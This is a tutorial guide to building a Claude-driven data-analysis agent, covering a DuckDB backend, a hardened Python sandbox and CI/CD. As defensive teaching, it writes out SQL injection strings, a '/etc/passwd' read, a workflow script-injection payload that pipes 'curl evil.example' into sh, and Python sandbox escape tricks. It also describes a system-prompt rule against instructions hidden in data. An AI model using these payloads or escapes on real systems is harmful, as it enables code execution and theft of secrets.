# Learning guide: how this project was built

This file grows with each step. Each lesson covers **what** was built, **why** it
was designed that way, the **key ideas** behind it, and an **exercise** so you can
practice on your own.

---

## Lesson 1: The data backend (FastAPI + DuckDB)

### What we built

Before an AI can analyze data, the data needs a home and a safe way to query it.
Step 1 is that foundation, with no AI yet:

| File | Job |
|---|---|
| `backend/app/main.py` | The web API: upload a CSV, list datasets, see a schema, run SQL |
| `backend/app/datastore.py` | Loads CSVs into DuckDB, describes tables, runs queries |
| `backend/app/sql_guard.py` | Makes sure only read-only SQL can run |
| `backend/tests/test_api.py` | Automated tests for every endpoint |
| `data/sample_sales.csv` | 2,000 made-up sales orders to play with |
| `.github/workflows/ci.yml` | Runs the tests on GitHub for every change (Lesson 3 adds much more) |

The flow looks like this:

```
CSV upload ──► pandas reads it ──► columns cleaned ──► DuckDB table
                                                          │
SQL from you (later: from the AI) ──► sql_guard ──► DuckDB ──► rows as JSON
```

### Why these choices

**Why build the backend before the AI?** An agent is only as good as its tools.
In step 2, Claude won't touch the database directly. It will *ask* our code to
run a query, and our code decides whether that's allowed. So we build and test the
tools first, by hand, with no AI involved.

**Why DuckDB?** It's an *analytical* database that runs inside Python. There is
no server to install. It's very fast at the queries analysts write (`GROUP BY`,
`SUM`, `date_trunc`), and it speaks normal SQL, so the AI's SQL skills transfer.
A comparison:

- **SQLite** is also embedded, but it's built for app data (many small reads and
  writes), not analytics.
- **Postgres** is great, but it needs a server. We'll add it in step 4 as a
  "connect your own database" option.

**Why FastAPI?** It's the most common modern Python web framework. You describe
your inputs with type hints, and FastAPI validates them and generates interactive
docs at `/docs` for free.

### Key ideas

**1. Never trust SQL you didn't write.** In step 2 an LLM writes SQL. LLMs make
mistakes, and a malicious CSV could even contain text that tricks the model. So
we have **three layers of defense**. This idea is called *defense in depth*:

1. **Parse, don't pattern-match.** `sql_guard.py` asks DuckDB's own parser what
   each statement is. A naive check like `sql.startswith("select")` would let
   `SELECT 1; DROP TABLE sales` through. The parser sees two statements and we
   reject it.
2. **Lock the database down.** We open DuckDB with `enable_external_access=False`,
   so even a valid `SELECT * FROM read_csv('/etc/passwd')` can't read files.
   `lock_configuration=True` stops SQL from turning that setting back on.
3. **Cap the output.** Queries are wrapped as `SELECT * FROM (...) LIMIT n+1`. We
   fetch one extra row so we can tell the caller the result was truncated. That
   matters later, because the AI needs to know when it's seeing only part of the
   data.

**2. Error messages are for the agent too.** When SQL fails, we return DuckDB's
real message (for example, *column "no_such_column" not found*). In step 2 the
agent will read that error and fix its own query. That's the "may re-analyze"
loop in the diagram.

**3. `describe()` is the AI's map.** The schema, row count and 5 sample rows are
exactly what we'll put in front of Claude so it knows the column names and types
before it writes any SQL. Without that, it would guess column names.

**4. Clean the data at the door.** CSV headers like `Total $` or `Order ID` are
painful in SQL. We convert them to `total` and `order_id`, rename duplicate
columns, and turn text like `2025-03-14` into real dates so that date functions
work.

**5. The app factory pattern.** `create_app(store, llm)` builds the app with
whatever datastore (and, from step 2, model client) you hand it. The tests pass a
fresh in-memory database each time, so no test can affect another. This is a
small form of *dependency injection*.

### Try it

You need [uv](https://docs.astral.sh/uv/) and `make` (Lesson 3 explains both).
From the repository root:

```bash
make setup    # installs the exact package versions from backend/uv.lock
make test     # runs every test; all of them should pass
make run      # then open http://localhost:8000/docs
```

In `/docs`, upload `data/sample_sales.csv` with **POST /datasets**, then try
**POST /query** with:

```sql
SELECT region, date_trunc('quarter', order_date) AS quarter, ROUND(SUM(revenue)) AS revenue
FROM sample_sales GROUP BY 1, 2 ORDER BY 1, 2
```

Look at the South region. Something happens in Q4. Spotting things like that is
what our agent will learn to do on its own.

### Exercises

1. **Break the guard.** Try to get a harmful query past `/query`. Ideas: `PRAGMA`,
   `CREATE TABLE`, a comment trick like `SELECT 1 -- ; DROP TABLE x`. Which layer
   stops each one?
2. **Add an endpoint.** Write `DELETE /datasets/{name}` that drops a table, and add
   a test for it. Hint: `run_query` can't do this, because it only allows SELECT.
   Why is it fine for *this* endpoint to run a `DROP`?
3. **Column stats.** Add a `stats` field to `describe()` with min, max and the
   number of missing values for each column. This will give the agent more context
   later.

### Words to know

- **Embedded database:** a database that runs inside your program, not as a separate server.
- **Defense in depth:** several independent safety layers, so one failure isn't fatal.
- **Pydantic model:** a Python class that validates incoming JSON (`QueryRequest`).
- **CI (continuous integration):** GitHub runs your tests automatically on every change.

---

## Lesson 2: The agent loop (Claude + tool calling)

### What we built

| File | Job |
|---|---|
| `backend/app/agent/orchestrator.py` | **The agent loop**: talks to Claude, runs tools, repeats until there's an answer |
| `backend/app/agent/llm.py` | The connection to Claude, behind a small `LLMClient` interface |
| `backend/app/agent/tools.py` | The 3 tools: `query_database`, `run_python`, `make_chart` |
| `backend/app/agent/charts.py` | Turns a query result into a Plotly chart |
| `backend/app/agent/events.py` | The events the agent reports for each step |
| `backend/app/agent/sandbox.py` | Runs AI-written Python safely |
| `backend/app/cli.py` | Ask questions from the terminal and watch every step |
| `POST /ask` in `main.py` | The same agent behind the API |
| `backend/tests/test_agent.py` | Tests that use a **fake** Claude (`backend/tests/fakes.py`) |

### The big idea: an agent is just a loop

People talk about "agents" as if they're magic. Here's the whole thing:

```
messages = [the datasets + the user's question]
loop (at most 12 times):
    reply = Claude(system prompt, tool definitions, messages)
    if reply.stop_reason == "tool_use":       # Claude wants to use tools
        for each tool call in reply:
            result = OUR CODE runs the tool
        messages += [reply, all the results]  # Claude sees what happened
    else:                                      # "end_turn"
        return reply.text                      # the final answer
```

Open `orchestrator.py` and find `def run`. It's about 35 lines, plus three small
helpers (`_run_tools`, `narrate` and `final_event`), and that's the entire agent
from the diagram in the screenshot. (Lesson 3 explains why no function is longer
than 60 lines.)

| Diagram box | Code |
|---|---|
| Agent orchestrator, "plans analysis steps" | Claude, guided by `SYSTEM_PROMPT` |
| Query database / Run code / Generate chart | `tool_definitions()` + `ToolExecutor` |
| "may re-analyze" | the loop: errors go back to Claude, and it tries again |
| Interpret results, Answer + visualization | Claude's final message + the `charts` list |

### How tool calling actually works

1. **We describe tools to Claude** with a name, a description and a JSON Schema
   (see `tool_definitions()` in `tools.py`). Claude never runs anything itself.
2. **Claude replies with a request**, a `tool_use` block like
   `{"name": "query_database", "input": {"sql": "SELECT ...", "purpose": "..."}}`,
   and `stop_reason == "tool_use"`.
3. **We run it** and send back a `tool_result` block with the same `tool_use_id`,
   so Claude knows which result belongs to which request.
4. **Claude reads the result** and decides what to do next: another query, a chart,
   or the final answer.

Two rules from the API that are easy to get wrong (both are tested):
- Send Claude's whole reply back unchanged (`response.content`), including its
  thinking blocks. Don't send just the text.
- If Claude asks for several tools at once, return **all** the results in **one**
  user message.

### Design decisions, and why

**Tool descriptions are prompts.** Look at how much `query_database`'s
description says: *one* SELECT, prefer aggregating, and what to do on error.
Claude chooses tools based on these words, so vague descriptions lead to bad tool
use. `strict: true` makes Claude's inputs always match the schema exactly.

**Every tool has a `purpose` field.** It costs nothing, and it gives the user a
plain-English line for each step ("Revenue by region"). It also makes Claude
state its intent before acting, which tends to improve its choices.

**Errors are information, not crashes.** A typo in SQL returns the database's
error with `is_error: true`. Claude reads *column "revenu" not found* and fixes
it. That's the "may re-analyze" arrow. Only truly unexpected errors stop the loop.

**The datasets go in the first message.** `build_schema_context()` uses the same
`describe()` from Lesson 1, so Claude knows the column names before it writes
any SQL. Otherwise its first step would always be guessing. The description goes
in the first user message, inside `<datasets>` tags, and not in the system
prompt. Its sample rows come from an uploaded file, so they are *data to
analyze*, not *instructions to follow*. The system prompt also says to ignore
any instructions found inside the data. Together, that makes prompt injection
(Lesson 1, idea 1) harder.

**Code gets data through SQL, not files.** `run_python` takes a `sql` query and a
`code` string. We run the SQL through the same safety guard, hand the result to
the code as `df`, and return only what the code prints. The AI never touches files.

**Charts are data, not images.** `make_chart` returns a Plotly JSON spec
(`{data, layout}`) that the browser will draw in step 3. It's interactive, small,
and needs no extra Python package.

**Caps everywhere:** 12 steps per question, 100 rows shown to Claude, 50,000
characters per tool result, 15 seconds per code run. An agent without limits can
loop forever and run up a bill.

### Running AI-written code safely (`sandbox.py`)

Same idea as Lesson 1, defense in depth:
1. **Inspect before running.** `check_code()` parses the code into a syntax tree
   (`ast`) and blocks `import os`, `open(...)`, `eval`, `__import__`, dunder
   tricks like `().__class__`, private names like `from random import _os`, and
   pandas file methods like `to_csv`.
2. **Separate process.** It runs in a new `python -I` process, so a crash can't
   take down the server.
3. **Limits.** A 15-second timeout, a 10-second CPU cap and a 1 GB memory cap.
   The process also can't write to files, open any new file descriptor (a file
   or a network connection), or start processes or threads.
4. **An audit hook.** Python calls a function of ours before every sensitive
   action, such as opening a file or sending a signal, and our function refuses.
   Python removes the hook when it shuts down, so the process ends with
   `os._exit()` as soon as the code is done, without that shutdown.
5. **No secrets.** The child process gets an empty folder and almost no
   environment variables, so your API key isn't visible to it.

**Why so many layers?** A review found that layer 1 on its own could be fooled:
`from random import _os` hands the code the `os` module that `random` uses
inside, and from there it could read the server's API key. Python is too
flexible for a list of banned things to be complete. So the tests run code that
layer 1 would refuse, and check that layers 3 and 4 still stop it. When you
can't make one wall perfect, build several, and test each one on its own.

**Why test on two Python versions?** CI runs every test on Python 3.13 and 3.14,
and one sandbox test passed on 3.13 but failed on 3.14. In 3.14, pandas loads a
module that starts subinterpreters: a second Python inside the same process,
which our audit hook does not watch. Looking closer found one more gap: code
could leave a `__del__` method behind that runs while Python shuts down, after
the hook is gone. The sandbox now never loads that module and skips the
shutdown, and the tests try both tricks. A new version of a language or a
library can change what your code relies on, so test every version you support.

Be honest about the limits in interviews: this is good for a portfolio project.
For a real product, you'd add a container with no network access (Docker or
gVisor), or use a hosted code-execution service.

### Claude API settings we chose (`ClaudeClient` in `llm.py`)

| Setting | Why |
|---|---|
| `model="claude-opus-5-5"` | The current default Claude model. Change it with `ANTHROPIC_MODEL` |
| `thinking={"type": "adaptive", "display": "summarized"}` | Claude decides how much to reason, and we get a readable summary to show the user |
| `output_config={"effort": "medium"}` | Balances quality and cost. Try `high` for harder questions (`AGENT_EFFORT`) |
| `cache_control={"type": "ephemeral"}` | Every loop step re-sends the same system prompt and history. Caching makes those repeats much cheaper |
| `fallbacks="default"` | If the model declines a request, the API retries on a fallback model |

We also handle every way the loop can end: `end_turn` (answer), `tool_use`
(keep going), `max_tokens` (answer cut off), `refusal`, `pause_turn`, and API
errors like a bad key or rate limits.

**Why write the loop ourselves?** Anthropic's SDK has a "tool runner" that does
the loop for you, and there's also **Claude Managed Agents**, where Anthropic
hosts the whole loop and a code sandbox. Both are great for production. We wrote
the loop by hand because (a) understanding it is the point of this project, and
(b) we want to `yield` every step to stream it to the UI in step 3. In an
interview, being able to explain this loop line by line is the skill.

### Testing an AI app without paying for AI

The agent doesn't create its own Claude client. It takes any object with a
`create_message()` method, described by the `LLMClient` interface in `llm.py`.
The app passes the real `ClaudeClient`. `test_agent.py` passes a `FakeClient`
(from `tests/fakes.py`) that returns **scripted** Claude replies. That tests
*our* code (tools run, results go back in the right shape, errors are
recoverable, the loop stops) for free, in milliseconds, with the same result
every run. Testing the *quality* of Claude's answers is different. That's the
evaluation set in step 4.

### Try it

```bash
cp .env.example .env            # then paste your key after ANTHROPIC_API_KEY=
make setup
make test                       # every test passes, and no key is needed
cd backend
uv run python -m app.cli ../data/sample_sales.csv "Which region's revenue fell the most in Q4, and why?"
```

Watch the steps. Does it find the South region's Q4 drop? Does it dig into *why*
(which products or channels)?

### Exercises

1. **Add a tool.** Write `describe_column` that returns min, max, mean, the number
   of distinct values and the top 5 values for one column. Add the definition and
   the handler, then a test with `FakeClient`. Does Claude use it?
2. **Break it on purpose.** Ask *"Delete all the South orders"*. What does Claude
   do? Which layer would stop it if it tried?
3. **Prompt engineering.** Remove the "Check your numbers" line from
   `SYSTEM_PROMPT`, ask the same question 3 times, then put it back. Do you see a
   difference? (This is why we build an evaluation set in step 4.)
4. **Cost awareness.** Print `reply.usage` in `ClaudeClient.create_message`. How
   many tokens does one question use? How much is read from the cache on later
   steps (`cache_read_input_tokens`)?

### Words to know

- **Tool use / function calling:** the model asks *your code* to run a function and reads the result.
- **Agent loop:** call model, run tools, repeat until the model answers.
- **`stop_reason`:** why the model stopped (`tool_use`, `end_turn`, `max_tokens`, `refusal`).
- **System prompt:** standing instructions and context, separate from the user's question.
- **AST (abstract syntax tree):** code parsed into a structure you can inspect safely.
- **Prompt caching:** reusing an already-processed prompt prefix so it costs less.
- **Test double / fake:** a stand-in object (our `FakeClient`) that makes tests fast and predictable.

---

## Lesson 3: Engineering standards (CI/CD and the NASA/JPL rules)

### What we built

No new features this time. Instead, the project got everything a professional
repository has around its code: automated checks on every change, a strict
coding standard, security scanning, and an automated release process.

| File | Job |
|---|---|
| `backend/pyproject.toml`, `backend/uv.lock` | The dependencies, their exact locked versions, and the settings of every Python tool |
| `Makefile` | Short commands: `make check`, `make test`, `make run` and more (`make` lists them) |
| `.pre-commit-config.yaml` | Checks that run on your computer before every commit |
| `.github/workflows/ci.yml` | **CI**: every check, on every pull request |
| `.github/actions/setup-backend/action.yml` | Setup steps that the CI jobs share |
| `.github/workflows/release.yml` | **CD**: a version tag creates a GitHub Release and a Docker image |
| `.github/workflows/codeql.yml` | CodeQL, GitHub's security scanner |
| `.github/dependabot.yml` | Weekly pull requests that update our dependencies |
| `.github/zizmor.yml` | Settings for zizmor, a security linter for GitHub Actions |
| `backend/tools/power_of_ten.py` | Our own checker for the NASA/JPL "Power of Ten" rules |
| `backend/app/invariants.py`, `files.py`, `watchdog.py` | Small helpers the rules need: `require()`, `read_capped()` and a timer |
| `backend/Dockerfile`, `scripts/smoke-test.sh` | The container image, and a test that starts it and uses it |
| `docs/CODING_STANDARD.md` | The coding standard, rule by rule |
| `CONTRIBUTING.md`, `SECURITY.md`, `CODE_OF_CONDUCT.md`, `CHANGELOG.md`, `.github/ISSUE_TEMPLATE/`, `.github/pull_request_template.md`, `.github/CODEOWNERS` | How to contribute, report a vulnerability, behave, and follow the history |

### The big idea: machines check what machines can check

A reviewer's attention is expensive, and people miss things. So every rule that a
program can check is checked by a program, as early as possible. People then
review what only people can judge: the design, the naming, whether the change is
a good idea.

```
you edit ──► git commit ──► git push ──► pull request ──► merge ──► git tag v0.2.0
               │              │             │                          │
          pre-commit       pre-push:     CI (8 jobs)              release workflow:
          hooks, in        all tests     + CodeQL, in             CI again, GitHub Release,
          seconds                        minutes                  Docker image on ghcr.io
```

Each layer catches a problem earlier than the next one, when it is cheapest to
fix. A typo caught by a pre-commit hook costs seconds. The same typo caught in
production costs a lot more.

### One source of truth for dependencies (uv)

Before this lesson, the project used `requirements.txt` files and pip. Now it
uses [uv](https://docs.astral.sh/uv/):

- **`pyproject.toml`** lists what the project needs, such as `pandas>=3.1`, and
  holds the settings of every tool (Ruff, mypy, pytest, coverage).
- **`uv.lock`** records the *exact* version of every package, including the
  dependencies of our dependencies, with a hash of each file. Your computer, CI
  and the Docker image all install exactly the same thing. "It works on my
  machine" stops being a problem.
- **`--locked`** appears in every install command. If someone changed
  `pyproject.toml` but forgot to update `uv.lock`, the install fails instead of
  quietly picking different versions.
- **Dependency groups** keep the developer tools (pytest, Ruff, mypy) apart from
  what the app needs to run. The Docker image installs only the runtime group.

The tools are dependencies too. Ruff, mypy and every pre-commit hook come from
`uv.lock`, so your computer and CI always run the same versions.

### The quality gates

CI (`.github/workflows/ci.yml`) runs these jobs on every pull request. Most of
them run a `make` command, so you can run the same check yourself first.

| CI job | What it checks | On your computer |
|---|---|---|
| Lint and format (Ruff) | Likely bugs, security problems, style, and one consistent layout | `make lint` |
| Types (mypy and basedpyright) | Every function has type hints, and every value is used the way its type allows | `make typecheck` |
| NASA/JPL Power of Ten | Our coding standard (below) | `make jpl` |
| Tests (Python 3.12, 3.13, 3.14) | Every test passes on every Python version we support, with at least 95% branch coverage | `make test` |
| Dependency audit (pip-audit) | No package we use has a known vulnerability | `make security` |
| Files, secrets, scripts and workflows (pre-commit) | Whitespace, line endings, valid YAML and TOML, no keys or passwords, ShellCheck, zizmor, and the schemas of the GitHub files | `cd backend && uv run pre-commit run --all-files` |
| Docker image | The image builds, starts, passes its health check and answers real requests | `make docker smoke` |
| All checks passed | Sums up the jobs above, so branch protection needs only this one | (none) |

Three ideas are worth learning from this table:

- **Branch coverage, not line coverage.** `if x: do()` is one line but two
  branches. Branch coverage checks that the tests tried both: `x` true *and*
  false.
- **Warnings are errors.** pytest runs with `filterwarnings = ["error"]`. A
  `DeprecationWarning` today is a crash after the next upgrade, so we fix it now.
- **Run CI on a schedule too.** CI also runs every Monday. A vulnerability can be
  published for a package that has not changed in our repository, and the weekly
  run catches it.

### The NASA/JPL "Power of Ten" rules, in Python

In 2006 Gerard Holzmann of NASA's Jet Propulsion Laboratory wrote ten rules for
the C code that flies spacecraft. They make code easy to analyze: no surprises
in control flow, loops that always end, memory that stays bounded. Python is not
C, so we adapted each rule. [docs/CODING_STANDARD.md](docs/CODING_STANDARD.md)
explains every rule in full.

| # | The original rule (C) | Our Python version |
|---|---|---|
| 1 | Simple control flow, no recursion | No recursion, found through a call graph. Complexity at most 10 |
| 2 | Every loop has a fixed bound | No `while`, no endless iterators. Outside work is bounded in time by a watchdog |
| 3 | No memory allocation after startup | Every input, file read and result has a size cap |
| 4 | Functions fit on one page | At most 60 lines of code per function |
| 5 | Two assertions per function | `require()` instead of `assert`. At least 0.5 checks per function on average |
| 6 | Smallest possible scope | No `global`, no mutable state at module level |
| 7 | Check every return value | Use every result or write `_ = f()`. Never swallow an exception |
| 8 | Limit the preprocessor | No `eval`, `exec`, `getattr`, `pickle`, metaclasses or dunder tricks |
| 9 | Limit pointers, no function pointers | No lambdas, no functions passed around as values: pass objects |
| 10 | Zero warnings, daily static analysis | Every tool strict, warnings are errors, CI on every change and every week |

Three adaptations show how a rule's *idea* survives the change of language:

- **Rule 5 and `assert`.** Python deletes every `assert` statement when it runs
  with `python -O`. A safety check that can disappear is not a safety check. So
  the app calls `require(condition, message)` from `invariants.py`, which always
  runs.
- **Rule 2 and waiting.** Some loops wait for something outside our code, such
  as a SQL query or a child process. There is no loop of ours to bound, so we
  bound the *time* instead: `watchdog.py` starts a timer thread that stops the
  work when the time limit passes.
- **Rule 9 and swapping behavior.** C uses function pointers to swap behavior;
  Python code often passes functions around. We pass an *object* that has a
  known method instead. The agent takes any `LLMClient`, so the tests can hand
  it a fake Claude (Lesson 2).

### How the checker works: a small static analyzer

`backend/tools/power_of_ten.py` reads code without running it. That is called
*static analysis*. It works in four steps:

1. **Parse.** `ast.parse()` turns each file into a tree of nodes: a `While`
   node, a `Call` node, a `FunctionDef` node, and so on. This is the same AST you
   met in the sandbox in Lesson 2.
2. **Walk and match.** It visits every node and uses `match` to spot patterns.
   For example, `case ast.While():` means "this is a `while` loop: report R2".
3. **Build a call graph** for rule 1: for every function, the set of functions
   it calls. Then it asks, for each function, "can this function reach itself?"
   It answers with Warshall's algorithm. Each function's set of reachable
   functions is stored as the bits of one integer:

   ```python
   for middle in range(len(names)):  # add the paths that go through `middle`
       bit = 1 << middle
       for start in range(len(names)):
           if reach[start] & bit:            # start reaches middle...
               reach[start] |= reach[middle]  # ...so it reaches all that middle reaches
   ```

   Afterwards, a function whose own bit is set in its `reach` is recursive.
   Note that this needs no recursion itself: the checker follows its own rules.
4. **Read the comments** for rule 10. The AST drops comments, so the checker
   uses Python's `tokenize` module to find every `# noqa` and `# type: ignore`
   and check that each one gives a reason.

### What the rules found in our own code

Rules are only worth having if they catch real problems. Applying these rules to
the code from steps 1 and 2 found real bugs:

- **A crash in `make_chart`.** When Claude asked for a bar chart with an empty
  `y` column name, the tool failed with "Internal error in tool make_chart", which
  told Claude nothing. Adding the checks that rule 5 asks for fixed it: now the tool
  explains the mistake, and Claude can correct itself.
- **No limit on tool results.** A query that selects many wide text columns sent
  a huge result back to Claude, which makes the request slow and costly. Rule 3
  asked "what is the limit?". Now each tool result is cut at 50,000 characters,
  with a note that tells Claude to select fewer columns or aggregate.
- **Unbounded file reads.** The `.env` file and the CLI's input files were read
  whole, however large. They now go through `read_capped()`.
- **An unchecked promise.** The Claude API needs exactly one result for every
  tool call. The loop now checks that with `require()` before it sends the
  results back.

### Trusting other people's code (supply-chain security)

Most of the code we run was written by someone else: packages from PyPI, actions
in GitHub workflows, the Python base image. A *supply-chain attack* hides
malicious code in one of those. The defenses:

- **Lock and audit.** `uv.lock` pins every package with a hash, and `pip-audit`
  checks them against databases of known vulnerabilities.
- **Update, but not too fast.** Dependabot opens weekly pull requests with
  updates, and CI tests each one. A 7-day *cooldown* means a new version is only
  proposed once it is a week old. Hacked releases are usually found and removed
  within days. Security fixes skip the cooldown.
- **Least privilege in CI.** Each workflow says exactly which `permissions` its
  token has, and most jobs may only read. A job that must write gets only what it
  needs: CodeQL may upload its findings, and the release jobs may create the
  release and push the image.
- **Few outside actions.** The workflows use only GitHub's own actions
  (`actions/checkout`, `actions/setup-python` and CodeQL). Everything else is a
  plain shell command we can read, except Docker's own build tools, which the
  release job runs as container images to build for ARM. The one that needs full
  rights on the runner is pinned to an exact build by its digest, the same way
  `uv.lock` pins packages by hash. Checkouts use `persist-credentials: false`, so
  the token is not left on disk for later steps to find.
- **No script injection.** A workflow never pastes outside text into a shell
  script with `${{ ... }}`. Imagine `run: echo "${{ github.event.pull_request.title }}"`
  and a pull request titled `"; curl evil.example | sh; echo "`: GitHub would
  paste the title into the script, and run it. We pass values through
  environment variables instead, which the shell treats as data.
- **Automated reviewers.** zizmor checks the workflows for these mistakes on
  every commit, and CodeQL scans both the Python code and the workflows.
- **Secrets.** detect-secrets and detect-private-key stop a commit that contains
  a key. GitHub's own secret scanning watches the whole history, and its push
  protection can block a push that contains an Anthropic API key.

### The Docker image

`backend/Dockerfile` builds the image in two stages. The first installs the
packages with uv; the second copies in only the finished virtual environment, so
build tools never ship. The app runs as an ordinary user (user id 10001), not as
root, and the installed code belongs to root: if an attacker ever got in through
the app, they could not change its code. A `HEALTHCHECK` lets Docker see whether
the app still answers.

`scripts/smoke-test.sh` proves all of that on every pull request. It starts a
container, waits for the health check, checks the user and the file
permissions, uploads the sample CSV, runs a query, and runs Python in the
sandbox inside the container.

### Releases (the "CD" in CI/CD)

Versions follow [Semantic Versioning](https://semver.org/): `MAJOR.MINOR.PATCH`.
`CHANGELOG.md` collects the changes as they happen. To release, the maintainer
moves those notes under a version heading, merges, and pushes a tag such as
`v0.2.0`. Then `release.yml` takes over:

1. It checks that the tag is a version it can release (such as `v0.2.0` or the
   pre-release `v0.2.0rc1`), that it matches `__version__` in the code, and that
   the changelog has notes for that version.
2. It runs all of CI again, on exactly the tagged commit.
3. It builds the Docker image for Intel/AMD *and* ARM computers, and pushes it to
   the GitHub Container Registry. The image comes with a *provenance* record (how
   and from what it was built) and an *SBOM* (a list of every package inside it).
4. Only then does it create the GitHub Release, with the changelog notes as its
   text. If the image fails, nothing has been announced yet.

Nobody builds a release by hand, so every release is built the same way.

### Try it

```bash
make setup    # once: installs everything, and the git hooks
make check    # everything CI checks in the code: lint, types, Power of Ten, tests
make help     # every command, with a short explanation
```

Now break a rule on purpose. Add this to any function in `backend/app/`:

```python
while True:
    break
```

Run `make jpl`. The checker prints the file, the line, `R2` and how to fix it.
Remove the loop, then try a module-level `SEEN = []` (rule 6) or an
`assert` (rule 5).

With Docker running, `make docker smoke` builds the image and smoke-tests it,
exactly as CI does.

### Exercises

1. **Meet every rule.** Break each of the ten rules once (the examples in
   `docs/CODING_STANDARD.md` help), and read what reports it: the checker, Ruff,
   or a type checker.
2. **Turn the ratchet.** Add a meaningful `require()` to three functions that
   rely on something they never check. Run `make jpl` to see the new density,
   then raise `MIN_ASSERTION_DENSITY` to match.
3. **Teach the checker something new.** `json.load(f)` reads a whole file into
   memory. Make rule 3 report it, and add tests to
   `backend/tests/test_power_of_ten.py`: one for what it must report, one for
   what it must allow.
4. **Attack a workflow.** In a scratch branch, add a step with
   `run: echo "${{ github.event.pull_request.title }}"` to `ci.yml`, then run
   `uv run --project backend zizmor .` from the repository root. What does it
   report, and how would you fix it?
5. **Ship a release** (after the open pull requests are merged): set the version
   to `0.2.0`, move the notes in `CHANGELOG.md`, preview them with
   `scripts/release-notes.sh 0.2.0`, merge, push the tag `v0.2.0`, and watch the
   Release workflow in the Actions tab.

### Words to know

- **CI (continuous integration):** every change is built and checked automatically.
- **CD (continuous delivery):** a release is built and published automatically.
- **Quality gate:** a check that must pass before a change can be merged.
- **Lockfile:** a file with the exact version (and hash) of every package.
- **Static analysis:** checking code by reading it, without running it.
- **Call graph:** which function calls which. A cycle in it means recursion.
- **Invariant:** a condition that must always hold; `require()` checks one.
- **Ratchet:** a limit that may only move in one direction, toward stricter.
- **Supply-chain attack:** malicious code slipped into something you depend on.
- **Least privilege:** give each job only the permissions it needs.
- **SBOM (software bill of materials):** the list of every package in a build.
- **Semantic Versioning:** `MAJOR.MINOR.PATCH`, where the number you bump says what kind of change it is.
- **Smoke test:** a quick end-to-end check that the thing starts and basically works.


---

*Next: Lesson 4, the chat UI. Streaming agent steps to the browser live with
Server-Sent Events, and drawing the charts with Plotly.*
